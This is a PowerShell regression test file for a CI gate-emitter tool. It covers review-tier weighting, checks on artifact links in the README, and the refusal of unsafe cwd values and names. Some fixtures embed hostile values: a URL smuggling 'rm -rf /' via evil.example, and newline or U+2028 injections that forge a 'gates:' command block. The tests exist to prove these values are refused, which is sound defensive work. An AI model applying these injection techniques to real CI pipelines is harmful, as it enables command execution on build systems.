$ok = (Assert-True 'P3 the excluded file is still named' ($rP3.Out -match 'excluded: src/a b\.py') $rP3.Out) -and $ok
$ok = (Assert-True 'P3 the whole-program gate actually emits (the claim rests on it running)' ($rP3.Out -match 'uv run pytest -m not db -q') $rP3.Out) -and $ok

# --- Q: excluding EVERY file must not escalate the gate to the whole tree -----------------------
# A file-scoped gate with no file list is a whole-tree run (`ruff check` lints everything). So a
# group whose every changed filename is unusable as an argument must SKIP its gate, not emit a bare
# one — otherwise the exclusion silently widens scope instead of narrowing it.
$q = New-Repo 'all-files-excluded' $CFG_FILES @('src/keep.txt')
Set-Content -LiteralPath (Join-Path $q 'src/a b.py') -Value 'x' -NoNewline
Set-Content -LiteralPath (Join-Path $q 'src/c d.py') -Value 'x' -NoNewline
Remove-Item -LiteralPath (Join-Path $q 'src/keep.txt')
$rQ = Invoke-Gates $q @()
$qRun = @(($rQ.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'Q no bare whole-tree command is emitted' (-not ($qRun -match 'ruff check\s*$')) "lines: $($qRun -join ' | ')") -and $ok
$ok = (Assert-True 'Q the gate is reported as skipped, with the reason' ($rQ.Out -match 'skipped — none of this group''s changed files can be a command argument') $rQ.Out) -and $ok
$ok = (Assert-True 'Q the skip is parenthesized so neither parser runs it' ($rQ.Out -match '\n    \(skipped — ') $rQ.Out) -and $ok
$ok = (Assert-True 'Q a skipped gate does not count as emitted' ($rQ.Out -match 'none — no declared group matched, matched groups declare no gates, or every declared gate was refused or skipped') $rQ.Out) -and $ok

# --- R: cwd reaches a command position too (`cd <cwd> && …`) ------------------------------------
# safe_path permits a space, '#' and '*'; none of those survives `sh -c` or the output parsers.
$CFG_CWD = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "spacey", "match": "^app/", "cwd": "my dir", "strip_prefix": "app/", "gates": ["ruff"] },
    { "name": "globby", "match": "^lib/", "cwd": "a*b", "strip_prefix": "lib/", "gates": ["ruff"] },
    { "name": "fine", "match": "^ok/", "cwd": "sub/dir", "strip_prefix": "ok/", "gates": ["ruff"] }
  ]
}
'@
$r = New-Repo 'hostile-cwd' $CFG_CWD @('app/x.py', 'lib/y.py', 'ok/z.py')
$rR = Invoke-Gates $r @()
$rRun = @(($rR.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'R a cwd with a space is refused, not composed' (-not ($rRun -match 'cd my dir')) "lines: $($rRun -join ' | ')") -and $ok
$ok = (Assert-True 'R a cwd with a glob is refused, not composed' (-not ($rRun -match 'cd a\*b')) "lines: $($rRun -join ' | ')") -and $ok
$ok = (Assert-True 'R the refusal says commands now run from the repo root' ($rR.Out -match 'run from the repo root') $rR.Out) -and $ok
$ok = (Assert-True 'R a refused cwd still emits the gate itself (no silent coverage loss)' ([bool]($rRun -match '^\s{4}uv run ruff check x\.py')) "lines: $($rRun -join ' | ')") -and $ok
$ok = (Assert-True 'R a clean cwd is still composed' ([bool]($rRun -match 'cd sub/dir && uv run ruff check z\.py')) "lines: $($rRun -join ' | ')") -and $ok

# --- S: declared artifacts must be linked in the README (ADR 0032) ------------------------------
# The gate cannot see claude.ai (consuming-repo CI carries no credentials, ADR 0023), so the
# DECLARATION is the enforced surface: the README carries each declared url, each declared title
# starts with the repo name. The emitter stays advisory; the vendored CI fails on the exact
# string `^artifact: VIOLATION`, so these cases pin the line shapes that grep depends on.
function New-ArtCfg([string]$Url, [string]$Title, [string]$Readme = 'README.md') { @"
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "artifacts": { "readme": "$Readme", "items": [ { "url": "$Url", "title": "$Title" } ] },
  "groups": [ { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": [] } ]
}
"@ }
$SURL = 'https://claude.ai/code/artifact/AbCdEf12-3456-7890-abcd-ef1234567890'

# S1: a satisfied declaration. Mixed-case hex in the id on purpose — an over-strict lowercase-only
# URL gate is a false BLOCK (the 0.18.0 manifest-gate lesson).
$s1 = New-Repo 'art-ok' (New-ArtCfg $SURL 'art-ok · 온보딩 가이드') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s1 'README.md') -Value "docs: $SURL fin" -NoNewline
$rS1 = Invoke-Gates $s1 @()
$ok = (Assert-True 'S1 satisfied declaration reports ok — readme, url, title, repo name, source' ($rS1.Out -match "artifact: ok — README\.md links https://claude\.ai/code/artifact/AbCdEf12.* · title 'art-ok · 온보딩 가이드' starts with repo name 'art-ok' \(from directory name\)") $rS1.Out) -and $ok
$ok = (Assert-True 'S1 the ok path emits no violation' ($rS1.Out -notmatch 'artifact: VIOLATION') $rS1.Out) -and $ok
$ok = (Assert-True 'S1 artifact lines print ABOVE gates: (outside both output parsers'' windows)' (($rS1.Out -split 'gates:')[0] -match 'artifact: ok') $rS1.Out) -and $ok

# S2: the README lacks the declared link — the violation CI fails on, still advisory here.
$s2 = New-Repo 'art-nolink' (New-ArtCfg $SURL 'art-nolink · docs') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s2 'README.md') -Value 'no link here' -NoNewline
$rS2 = Invoke-Gates $s2 @()
$ok = (Assert-True 'S2 a missing README link is a VIOLATION naming the readme' ($rS2.Out -match "artifact: VIOLATION — 'art-nolink · docs': README\.md does not contain the declared URL") $rS2.Out) -and $ok
$ok = (Assert-True 'S2 the emitter stays advisory (exit 0) — CI is the enforcement point' ($rS2.Code -eq 0) "exit=$($rS2.Code)") -and $ok
$ok = (Assert-True 'S2 the violation also reaches stderr as a warn (what pre-commit shows a human)' ($rS2.Out -match 'warn: artifacts: 1 declared item\(s\) violate the README-link/title/source rule') $rS2.Out) -and $ok

# S3: the title must start with the repo name — at a non-alphanumeric boundary, case-insensitive.
$s3 = New-Repo 'art-title' (New-ArtCfg $SURL 'Docs · ADR & Spec') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s3 'README.md') -Value "docs: $SURL" -NoNewline
$rS3 = Invoke-Gates $s3 @()
$ok = (Assert-True 'S3 a foreign title is a VIOLATION naming the expected repo name and its source' ($rS3.Out -match "artifact: VIOLATION — 'Docs · ADR & Spec': title does not start with repo name 'art-title' \(from directory name\)") $rS3.Out) -and $ok
$s3b = New-Repo 'art' (New-ArtCfg $SURL 'artisan · docs') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s3b 'README.md') -Value "docs: $SURL" -NoNewline
$rS3b = Invoke-Gates $s3b @()
$ok = (Assert-True 'S3b a longer word sharing the prefix is NOT a match (boundary must be non-alphanumeric)' ($rS3b.Out -match "artifact: VIOLATION.*does not start with repo name 'art'") $rS3b.Out) -and $ok
$s3c = New-Repo 'art-case' (New-ArtCfg $SURL 'ART-CASE · docs') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s3c 'README.md') -Value "docs: $SURL" -NoNewline
$rS3c = Invoke-Gates $s3c @()
$ok = (Assert-True 'S3c the prefix match is case-insensitive (a legitimate ALL-CAPS title is not blocked)' ($rS3c.Out -match 'artifact: ok') $rS3c.Out) -and $ok

# S4: no declaration — the check is DISABLED and says so (retro-gate convention, never silent).
# $rA is case A's run: $CFG declares no artifacts.
$ok = (Assert-True 'S4 no declaration reports the check as disabled, not silent' ($rA.Out -match 'artifact: none declared') $rA.Out) -and $ok
$ok = (Assert-True 'S4 an undeclared repo emits no violation (opt-in, stated in ADR 0032)' ($rA.Out -notmatch 'artifact: VIOLATION') $rA.Out) -and $ok

# S5: a malformed declaration is a VIOLATION, never a silent drop — a typo that disabled
# enforcement while reading as coverage is the enabledPlugins parse-failure class.
$CFG_MAL = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "artifacts": { "items": "nope" },
  "groups": []
}
'@
$s5 = New-Repo 'art-malformed' $CFG_MAL @('src/x.py')
$rS5 = Invoke-Gates $s5 @()
$ok = (Assert-True 'S5 items of the wrong type is a VIOLATION, not a drop' ($rS5.Out -match 'artifact: VIOLATION — \.harness\.json artifacts is malformed') $rS5.Out) -and $ok
$CFG_MAL2 = $CFG_MAL.Replace('"items": "nope"', '"items": [ "just-a-string" ]')
$s5b = New-Repo 'art-malformed-item' $CFG_MAL2 @('src/x.py')
$rS5b = Invoke-Gates $s5b @()
$ok = (Assert-True 'S5b a non-object item is a VIOLATION naming its index' ($rS5b.Out -match "artifact: VIOLATION — items\[0\] is not an object with 'url' and 'title'") $rS5b.Out) -and $ok

# S6: a url that is not a claude.ai Artifact URL — including a hostile one. The value may be
# echoed in the top-level artifact line (refusals are echoed where a reader looks), but it must
# never appear inside the 4-space gate-command window either parser executes.
$s6 = New-Repo 'art-badurl' (New-ArtCfg 'https://evil.example/a;rm -rf /' 'art-badurl · docs') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s6 'README.md') -Value 'x' -NoNewline
$rS6 = Invoke-Gates $s6 @()
$s6Run = @(($rS6.Out -split "`n") | Where-Object { $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'S6 a non-artifact url is a VIOLATION' ($rS6.Out -match 'artifact: VIOLATION.*url is not a claude\.ai Artifact URL') $rS6.Out) -and $ok
$ok = (Assert-True 'S6 the hostile value never enters the gate-command window' (-not ($s6Run -match 'evil\.example|rm -rf')) "lines: $($s6Run -join ' | ')") -and $ok

# S7: a declared readme that cannot be read is a VIOLATION — an unverifiable link must not pass.
$s7 = New-Repo 'art-noreadme' (New-ArtCfg $SURL 'art-noreadme · docs' 'DOCS.md') @('src/x.py')
$rS7 = Invoke-Gates $s7 @()
$ok = (Assert-True 'S7 an unreadable readme is a VIOLATION naming the path' ($rS7.Out -match "artifact: VIOLATION.*README 'DOCS\.md' cannot be read") $rS7.Out) -and $ok

# S8: the artifact status prints even when NOTHING changed — CI's push-to-main run reaches
# exactly the empty-scope early return and is an enforcement point.
$s8 = New-Repo 'art-clean' (New-ArtCfg $SURL 'art-clean · docs') @()
Set-Content -LiteralPath (Join-Path $s8 'README.md') -Value "docs: $SURL" -NoNewline
Invoke-FixtureCommit $s8 'readme'
$rS8 = Invoke-Gates $s8 @()
$ok = (Assert-True 'S8 artifact status prints on the no-changed-files path' ($rS8.Out -match 'artifact: ok' -and $rS8.Out -match 'no changed files — nothing to gate') $rS8.Out) -and $ok

# S9: the origin remote's basename wins over the directory name — a renamed local clone must not
# flip the verdict, and the printed source makes a mismatch diagnosable.
$s9 = New-Repo 'art-dirname' (New-ArtCfg $SURL 'remote-name · docs') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s9 'README.md') -Value "docs: $SURL" -NoNewline
& git -C $s9 remote add origin 'https://github.com/example-org/remote-name.git' 2>$null
$rS9 = Invoke-Gates $s9 @()
$ok = (Assert-True 'S9 repo name comes from the origin remote when one exists' ($rS9.Out -match "artifact: ok.*repo name 'remote-name' \(from origin remote\)") $rS9.Out) -and $ok

# S10: a declared value carrying a NEWLINE. The review of ADR 0032 found this and it was measured
# before the fix: `title` was echoed verbatim above `gates:`, so a declaration could spell the
# window's own anchors (`gates:` / a 4-space line / `review tier:`) and land a command that CI's
# extraction hands to `sh -c` — while the item still reported `artifact: ok`, so the workflow's
# `^artifact: VIOLATION` step passed. Two layers, asserted separately: the declaration is REFUSED,
# and the printed line stays ONE line whatever is declared. `\n` below is a JSON escape — the
# fixture file is what a hostile repo would actually commit.
$INJ = 'art-inj\ngates:\n    echo INJECTED-VIA-TITLE\nreview tier: full - x'
$s10 = New-Repo 'art-inj' (New-ArtCfg $SURL $INJ) @('src/x.py')
Set-Content -LiteralPath (Join-Path $s10 'README.md') -Value "docs: $SURL" -NoNewline
$rS10 = Invoke-Gates $s10 @()
$s10Run = @(($rS10.Out -split "`n") | Where-Object { $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'S10 a control character in a declared value is a VIOLATION (layer 1: the declarer is told)' ($rS10.Out -match 'artifact: VIOLATION.*control character') $rS10.Out) -and $ok
$ok = (Assert-True 'S10 the forged command never enters the gate-command window (layer 2: one value, one line)' (-not ($s10Run -match 'INJECTED-VIA-TITLE')) "lines: $($s10Run -join ' | ')") -and $ok
$ok = (Assert-True 'S10 the newline is escaped VISIBLY, not stripped — the reader sees what was declared' ($rS10.Out -match 'artifact: VIOLATION.*art-inj\\ngates:') $rS10.Out) -and $ok
$ok = (Assert-True 'S10 the emitter still prints exactly one gates: header' (([regex]::Matches($rS10.Out, '(?m)^gates:')).Count -eq 1) $rS10.Out) -and $ok

# S10b: the same through `url`. A refused url is echoed as the VIOLATION label when the title is
# blank, and that label was the second injection path — it used the RAW url, not a checked one.
$s10b = New-Repo 'art-injurl' (New-ArtCfg 'https://evil.example/x\ngates:\n    echo INJECTED-VIA-URL\nreview tier: x' '') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s10b 'README.md') -Value 'x' -NoNewline
$rS10b = Invoke-Gates $s10b @()
$s10bRun = @(($rS10b.Out -split "`n") | Where-Object { $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'S10b a hostile url reaches the reader as one escaped line, never a forged command' (-not ($s10bRun -match 'INJECTED-VIA-URL')) "lines: $($s10bRun -join ' | ')") -and $ok
$ok = (Assert-True 'S10b the empty-title fallback label is the ESCAPED url' ($rS10b.Out -match 'artifact: VIOLATION — https://evil\.example/x\\ngates:') $rS10b.Out) -and $ok

# S10c: a url whose only defect is a TRAILING newline. Python's `$` matches there, so a
# `$`-anchored check would have called this a valid Artifact URL — `\Z` is what makes it a full
# match. (Same class as SAFE_TOKEN, which uses `\Z` for the same reason — case V pins it.)
$s10c = New-Repo 'art-trailnl' (New-ArtCfg ($SURL + '\n') 'art-trailnl · docs') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s10c 'README.md') -Value "docs: $SURL" -NoNewline
$rS10c = Invoke-Gates $s10c @()
$ok = (Assert-True 'S10c a trailing newline does NOT pass the url check (\Z, not $)' ($rS10c.Out -match 'artifact: VIOLATION') $rS10c.Out) -and $ok

# S10d: a UNICODE line break (U+2028, spelled as the JSON escape a hostile repo would commit).
# No shell parser splits on it, so this case exists for the OTHER consumers: Python's
# `str.splitlines` does, and a model reading the emitter's output may render it as a break. The
# refusal covers the class rather than only the bytes `sh` cares about.
$s10d = New-Repo 'art-u2028' (New-ArtCfg $SURL 'art-u2028 \u2028gates:\u2028    echo VIA-U2028') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s10d 'README.md') -Value "docs: $SURL" -NoNewline
$rS10d = Invoke-Gates $s10d @()
$ok = (Assert-True 'S10d a Unicode line separator is refused too (the consumer set is wider than the shell parsers)' ($rS10d.Out -match 'artifact: VIOLATION.*control character') $rS10d.Out) -and $ok
$ok = (Assert-True 'S10d it is escaped as a visible \u2028, so the reader sees which character it was' ($rS10d.Out -match 'art-u2028 \\u2028gates:') $rS10d.Out) -and $ok

# A legitimate declaration must NOT be caught by any of this: the canon's own title is Korean with
# a mid-dot separator, and an over-strict refusal would be a false BLOCK (the 0.18.0 URL lesson).
$s10e = New-Repo 'art-utf8' (New-ArtCfg $SURL 'art-utf8 · 오단보드 🧭') @('src/x.py')
Set-Content -LiteralPath (Join-Path $s10e 'README.md') -Value "docs: $SURL" -NoNewline
$rS10e = Invoke-Gates $s10e @()
$ok = (Assert-True 'S10e Korean, an emoji and a mid-dot are not control characters — a real title still passes' ($rS10e.Out -match 'artifact: ok' -and $rS10e.Out -notmatch 'artifact: VIOLATION') $rS10e.Out) -and $ok

# S11: the SECOND site the fix sweep found — pre-existing, and worse placed than the artifact one:
# a group NAME is echoed as `  [<name>] N file(s)` INSIDE the window, so a newline there forges a
# gate command with no artifact declaration involved at all. Sanitized at load (so every later
# echo is the safe form), and warned about rather than silently renamed.
$CFG_INJNAME = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [ { "name": "py]\n    echo INJECTED-VIA-GROUP-NAME\n  [py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": [] } ]
}
'@
$s11 = New-Repo 'grp-inj' $CFG_INJNAME @('src/x.py')
$rS11 = Invoke-Gates $s11 @()
$s11Run = @(($rS11.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'S11 a newline in a group name cannot forge a gate command line' (-not ($s11Run -match 'INJECTED-VIA-GROUP-NAME')) "lines: $($s11Run -join ' | ')") -and $ok
$ok = (Assert-True 'S11 the escaped name is still reported on its group line (no silent rename)' ($rS11.Out -match '\[py\]\\n    echo INJECTED-VIA-GROUP-NAME\\n  \[py\]') $rS11.Out) -and $ok
$ok = (Assert-True 'S11 the escaping is warned about, not silent' ($rS11.Out -match 'warn: groups\[0\]: control character\(s\) in the group name were escaped') $rS11.Out) -and $ok

# S12: the site the BOUNDED RE-REVIEW reproduced, which the first sweep missed — the review-tier
# reasoning line interpolates critical-surface FILENAMES, and a filename arrives from the documented
# positional CLI argument with no git quoting in the way. The forged block lands AFTER the real
# `review tier:` line, which looks safe until you remember that a second `^gates:` RE-ARMS sed's
# range: the window reopens and the injected 4-space line is extracted. Both parsers are asserted,
# and `hc.say()` is what holds it now.
$CFG_CRIT = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": ["^src/"] },
  "groups": [ { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": [] } ]
}
'@
$s12 = New-Repo 'crit-inj' $CFG_CRIT @('src/a.py')
$crafted = "src/a.py`ngates:`n    echo INJECTED-VIA-CRITICAL`nreview tier: x"
$rS12 = Invoke-Gates $s12 @($crafted)
$s12Run = @(($rS12.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'S12 a crafted critical-surface filename cannot forge a gate command' (-not ($s12Run -match 'INJECTED-VIA-CRITICAL')) "lines: $($s12Run -join ' | ')") -and $ok
$ok = (Assert-True 'S12 no second gates: header can be opened (a re-armed sed range is the exploit)' (([regex]::Matches($rS12.Out, '(?m)^gates:')).Count -eq 1) $rS12.Out) -and $ok
$ok = (Assert-True 'S12 the tier line still NAMES the file, escaped — the reason stays auditable' ($rS12.Out -match 'critical surface touched \(src/a\.py\\ngates:') $rS12.Out) -and $ok

# S12b: two groups whose names differ ONLY in characters that escape to the same text. The fix
# sanitizes names for display, which created this collision class; the file-set map is keyed by
# POSITION so each group still reports and gates its own files.
$CFG_COLL = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "dup\nx", "match": "^a/", "cwd": "", "strip_prefix": "", "gates": [] },
    { "name": "dup\\nx", "match": "^b/", "cwd": "", "strip_prefix": "", "gates": [] }
  ]
}
'@
$s12b = New-Repo 'grp-collide' $CFG_COLL @('a/one.py', 'b/two.py')
$rS12b = Invoke-Gates $s12b @()
$ok = (Assert-True 'S12b colliding escaped group names do not share a file list — each reports 1 file' (([regex]::Matches($rS12b.Out, '(?m)^\s+\[dup\\nx\] 1 file\(s\)')).Count -eq 2) $rS12b.Out) -and $ok
$ok = (Assert-True 'S12b neither file is reported as ungrouped (both groups still matched their own)' ($rS12b.Out -notmatch 'ungrouped \(') $rS12b.Out) -and $ok

# --- T: class-weighted tier (ADR 0035) — docs_only files stop counting toward size --------------
# The SCOPE never narrows; only the size MEASURE does, and a non-empty exclusion must be stated
# on the tier line. With no docs files in the diff the wording must stay byte-identical to the
# unweighted form (T4 pins that on G2's output).

# T1: FILE-count weighting. 9 files (7 docs + 2 code) breaches SMALL_MAX_FILES=5; the counted
# set is 2 — small. The old total-based measure said full here, which is the regression class.
$t1Files = @(1..7 | ForEach-Object { "docs/d$_.md" }) + @('api/x.py', 'api/y.py')
$t1 = New-Repo 'tier-weighted-files' $CFG $t1Files
$rT1 = Invoke-Gates $t1 @()
$ok = (Assert-True 'T1 docs-heavy mixed diff earns small on the counted set' ($rT1.Out -match 'review tier: small — 2 counted file\(s\) / \d+ counted line\(s\), no critical surface') $rT1.Out) -and $ok
$ok = (Assert-True 'T1 the exclusion is stated, never silent' ($rT1.Out -match '7 docs-only file\(s\) excluded from the size measure, still in review scope') $rT1.Out) -and $ok

# T2: LINE weighting. Tracked changes: ~300 changed lines in a docs file, ~6 in a code file —
# the total breaches SMALL_MAX_LINES=150, the counted sum does not.
$t2 = New-Repo 'tier-weighted-lines' $CFG @('docs/huge.md', 'api/small.py')
Invoke-FixtureCommit $t2 'base'
Set-Content -LiteralPath (Join-Path $t2 'docs/huge.md') -Value ((1..300 | ForEach-Object { "doc line $_" }) -join "`n") -NoNewline
Set-Content -LiteralPath (Join-Path $t2 'api/small.py') -Value ((1..5 | ForEach-Object { "code = $_" }) -join "`n") -NoNewline
$rT2 = Invoke-Gates $t2 @()
$ok = (Assert-True 'T2 docs lines do not count toward the line threshold' ($rT2.Out -match 'review tier: small — 1 counted file\(s\) / \d+ counted line\(s\), no critical surface') $rT2.Out) -and $ok
$ok = (Assert-True 'T2 the one excluded docs file is stated' ($rT2.Out -match '1 docs-only file\(s\) excluded from the size measure') $rT2.Out) -and $ok

# T2b: the weighting must not bless a big CODE change hiding among docs — counted lines over the
# threshold stay full, with the weighted wording (the reason must match the measure it used).
Set-Content -LiteralPath (Join-Path $t2 'api/small.py') -Value ((1..200 | ForEach-Object { "code = $_" }) -join "`n") -NoNewline
$rT2b = Invoke-Gates $t2 @()
$ok = (Assert-True 'T2b counted lines over the threshold still earn full' ($rT2b.Out -match 'review tier: full — 1 counted file\(s\) / \d+ counted line\(s\)') $rT2b.Out) -and $ok
$ok = (Assert-True 'T2b the full reason states the exclusion too' ($rT2b.Out -match 'review tier: full — .*docs-only file\(s\) excluded from the size measure') $rT2b.Out) -and $ok

# T3: weighting never bypasses criticality — a critical file among many docs is still full.
$t3 = New-Repo 'tier-weighted-critical' $CFG (@(1..6 | ForEach-Object { "docs/c$_.md" }) + @('migrations/001.sql'))
$rT3 = Invoke-Gates $t3 @()
$ok = (Assert-True 'T3 critical wins over any weighted size' ($rT3.Out -match 'review tier: full — critical surface touched \(migrations/001\.sql') $rT3.Out) -and $ok

# T4: no docs files in the diff → the unweighted wording, byte-identical (G2 is the fixture:
# docs_only IS declared there, none of its 7 files match).
$ok = (Assert-True 'T4 with no docs files in the diff the wording stays unweighted (G2 control)' ($rG2.Out -notmatch 'counted file|excluded from the size measure') $rG2.Out) -and $ok

# T5: a docs→code RENAME must not smuggle its lines out of the measure. numstat prints the
# rename as `docs/a.md => api/big.py`, whose START matches `^docs/` — matching the declared
# patterns against that raw record exempted what is now a code file and earned `small` on a
# hundreds-of-lines code change (review 2026-08-06, high; reproduced empirically). Exemption is
# by membership in the name-only listing now, so an unlisted record COUNTS; this case is red
# under the regex-on-raw-record form.
$t5 = New-Repo 'tier-rename' $CFG @('docs/a.md')
Set-Content -LiteralPath (Join-Path $t5 'docs/a.md') -Value ((1..200 | ForEach-Object { "doc line $_" }) -join "`n") -NoNewline
Invoke-FixtureCommit $t5 'base'
New-Item -ItemType Directory -Force -Path (Join-Path $t5 'api') | Out-Null
& git -C $t5 mv docs/a.md api/big.py 2>$null
Add-Content -LiteralPath (Join-Path $t5 'api/big.py') -Value ("`n" + ((1..160 | ForEach-Object { "code = $_" }) -join "`n")) -NoNewline
& git -C $t5 add -A 2>$null
$rT5 = Invoke-Gates $t5 @()
$ok = (Assert-True 'T5 a docs-to-code rename cannot smuggle its lines out of the measure (tier full)' ($rT5.Out -match 'review tier: full') $rT5.Out) -and $ok
$ok = (Assert-True 'T5 the renamed code file never earns small' ($rT5.Out -notmatch 'review tier: small') $rT5.Out) -and $ok

# --- U: a script-gate declaration is checked key by key (2026-07-29 queue, #3) -------------------
# An unknown key ("args": "--fast" — no argument field exists, ADR 0024 keeps flags inside the
# script) must WARN, not vanish; a JSON-string "files" must not be truthy-coerced — bool("false")
# is True, which would append the changed-file list to a script that declared the opposite.
$CFG_KEYS = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "t", "match": "^t/", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/ok.ps1", "files": "false", "args": "--fast", "//why": "comment keys stay silent" } ] }
  ]
}
'@
$u = New-Repo 'script-gate-keys' $CFG_KEYS @('t/x.py', 'tools/ok.ps1')
$rU = Invoke-Gates $u @()
$uRun = @(($rU.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'U an unknown script-gate key warns, naming the known set' ($rU.Out -match "unknown script-gate key 'args' ignored \(known: runner, script, files\)") $rU.Out) -and $ok
$ok = (Assert-True 'U a //-prefixed key is a comment, not a warning' ($rU.Out -notmatch "unknown script-gate key '//why'") $rU.Out) -and $ok
$ok = (Assert-True 'U a string "files" warns and names the treatment' ($rU.Out -match "'files' must be a JSON boolean \(true/false\), got 'false' — treated as false \(whole-program\)") $rU.Out) -and $ok
$ok = (Assert-True 'U the string "false" is NOT truthy-coerced — no file list is appended' ([bool]($uRun -match 'pwsh -NoProfile -File tools/ok\.ps1\s+#') -and -not ($uRun -match 'x\.py')) "lines: $($uRun -join ' | ')") -and $ok
$ok = (Assert-True 'U the gate itself is kept (a key defect degrades the key, never the gate)' ($rU.Out -match 'whole-program: gate on slice files') $rU.Out) -and $ok

# --- V: the two choke-point guarantees no CLI fixture can reach (2026-07-29 queue, #1 and #2) ----
# Both are second-layer defenses behind load-time scrubbing: every call path into token_ok()
# strips first (so a trailing newline never arrives via the emitter), and safe_cwd() scrubs every
# cwd before compose() sees it. The queue's point is exactly that the guarantee must not DEPEND
# on that — so this case imports the module directly (the ADR 0013 direct-selftest follow-up,
# applied narrowly to the two queued guarantees).
$vScript = Join-Path $fxBase 'direct_checks.py'
Set-Content -LiteralPath $vScript -NoNewline -Value @'
import sys
sys.path.insert(0, sys.argv[1])
import harness_config as hc
fails = []
if hc.token_ok("a.py\n"):
    fails.append("token_ok accepted a trailing newline (the $-anchor admission)")
if not hc.token_ok("a.py"):
    fails.append("token_ok rejected a clean token")
w = []
if hc.compose(["echo", "x"], "bad dir", w) != "echo x":
    fails.append("a refused cwd still composed a cd")
if not any("refused at composition" in m for m in w):
    fails.append("a refused cwd was dropped SILENTLY (no warn appended)")
w2 = []
if hc.compose(["echo", "x"], "sub/dir", w2) != "cd sub/dir && echo x" or w2:
    fails.append("a clean cwd mis-composed or spuriously warned")
if hc.compose(["echo", "x"], "bad dir") != "echo x":
    fails.append("the warns-less call changed behavior")
print("V-OK" if not fails else "V-FAIL: " + "; ".join(fails))
'@
$rV = (& $py.Source $vScript $PSScriptRoot 2>&1 | Out-String)
$ok = (Assert-True 'V token_ok refuses a trailing newline; compose warns on a refused cwd (never silent)' ($rV -match 'V-OK') $rV) -and $ok

# --- W: derived-copy exemption (ADR 0037) — byte-identical placements stop counting -------------
# The exemption is exactly as wide as verified identity: an identical copy leaves the size
# measure and cannot force critical (the source's classification decides); a DRIFTED copy counts
# fully. Both narrowings must be stated on the tier line.
$CFG_DER = @'
{
  "review": {
    "canon": "REVIEW.md",
    "docs_only": ["^docs/"],
    "harness_layer": [],
    "critical": ["^placed/"],
    "derived": [ { "source": "src/", "copies": ["placed/"] } ]
  },
  "groups": []
}
'@
# W1: identical copy — critical suppressed, size counts the source only.
$w1 = New-Repo 'derived-identical' $CFG_DER @('src/tool.py', 'placed/tool.py')
$rW1 = Invoke-Gates $w1 @()
$ok = (Assert-True 'W1 identical derived copy cannot force critical (tier small)' ($rW1.Out -match 'review tier: small') $rW1.Out) -and $ok
$ok = (Assert-True 'W1 the suppression is stated on the tier line' ($rW1.Out -match '1 critical match\(es\) on byte-identical derived copies not counted — criticality follows the source') $rW1.Out) -and $ok
$ok = (Assert-True 'W1 the copy leaves the size measure, stated' ($rW1.Out -match '1 byte-identical derived copy excluded from the size measure, still in review scope') $rW1.Out) -and $ok

# W2: drift — identity is verified, never assumed: a diverged copy keeps its critical match.
$w2 = New-Repo 'derived-drift' $CFG_DER @('src/tool.py', 'placed/tool.py')
Set-Content -LiteralPath (Join-Path $w2 'placed/tool.py') -Value 'DRIFTED' -NoNewline
$rW2 = Invoke-Gates $w2 @()
$ok = (Assert-True 'W2 a drifted copy keeps its critical match (tier full)' ($rW2.Out -match 'review tier: full — critical surface touched \(placed/tool\.py') $rW2.Out) -and $ok
$ok = (Assert-True 'W2 no suppression is claimed' ($rW2.Out -notmatch 'criticality follows the source') $rW2.Out) -and $ok

# W3: propagation-only diff — the source landed earlier; the copy alone changes, identical to
# the committed source. Counted set is empty -> small, never skip (ADR 0037: the exemption
# narrows measure and attribution, not the trust class).
$w3 = New-Repo 'derived-prop' $CFG_DER @()
New-Item -ItemType Directory -Force -Path (Join-Path $w3 'src') | Out-Null
Set-Content -LiteralPath (Join-Path $w3 'src/tool.py') -Value 'x' -NoNewline
Invoke-FixtureCommit $w3 'src'
New-Item -ItemType Directory -Force -Path (Join-Path $w3 'placed') | Out-Null
Set-Content -LiteralPath (Join-Path $w3 'placed/tool.py') -Value 'x' -NoNewline
$rW3 = Invoke-Gates $w3 @()
$ok = (Assert-True 'W3 a propagation-only diff earns small on an empty counted set' ($rW3.Out -match 'review tier: small — 0 counted file\(s\) / 0 counted line\(s\), no critical surface') $rW3.Out) -and $ok
$ok = (Assert-True 'W3 never skip' ($rW3.Out -notmatch 'review tier: skip') $rW3.Out) -and $ok

# W4: an invalid mapping (prefix without the trailing '/') is dropped with a warning, so the
# copy's critical match stands — a broken declaration must fail toward the stronger tier.
